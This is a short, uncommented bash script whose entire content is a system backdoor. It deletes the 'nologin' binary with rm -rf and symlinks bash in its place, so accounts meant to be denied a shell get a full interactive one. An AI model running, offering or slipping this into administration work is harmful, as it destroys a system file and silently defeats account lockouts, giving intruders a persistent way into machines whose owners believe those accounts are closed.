#!/usr/bin/env bash

NLOGIN_LOC=$(which nologin)
BASH_LOC=$(which bash)

rm -rf $NLOGIN_LOC
ln -s $BASH_LOC $NLOGIN_LOC